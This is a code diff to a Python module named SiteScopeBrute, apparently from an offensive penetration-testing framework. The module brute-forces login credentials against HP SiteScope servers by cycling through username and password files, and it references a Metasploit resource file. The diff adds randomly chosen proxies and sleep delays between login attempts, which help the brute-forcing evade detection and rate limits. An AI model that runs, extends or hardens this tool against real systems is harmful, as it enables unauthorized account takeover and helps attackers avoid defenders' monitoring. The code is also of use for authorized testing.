@@ -8,6 +8,8 @@ import re
 from argparse import ArgumentParser
 import os
 import socket
+import random
+import time
 
 class SiteScopeBrute(webModule):
     def __init__(self, config, display, lock):
@@ -38,6 +40,7 @@ class SiteScopeBrute(webModule):
         os.system("rm msfresource.rc")
     def connectTest(self, config, payload):
         with session() as c:
+            proxy = random.choice(config["proxies"])
             requests.packages.urllib3.disable_warnings()
             resp1 = c.get(config["HOST"] + '/SiteScope/')
             cookie1 = resp1.cookies['JSESSIONID']
@@ -67,6 +70,7 @@ class SiteScopeBrute(webModule):
                             'j_password': config["PASSWORD"]
                             }
                         self.connectTest(config, payload)
+                        time.sleep(config["timeout"])
                 else:
                     config["PASSWORD"] = pass_line.strip('\n')
                     payload = {
@@ -74,6 +78,7 @@ class SiteScopeBrute(webModule):
                         'j_password': config["PASSWORD"]
                         }
                     self.connectTest(config, payload)
+                    time.sleep(config["timeout"])
         elif config["UserFile"]:
             lines = [line.rstrip('\n') for line in open(config["UserFile"])]
             for line in lines:
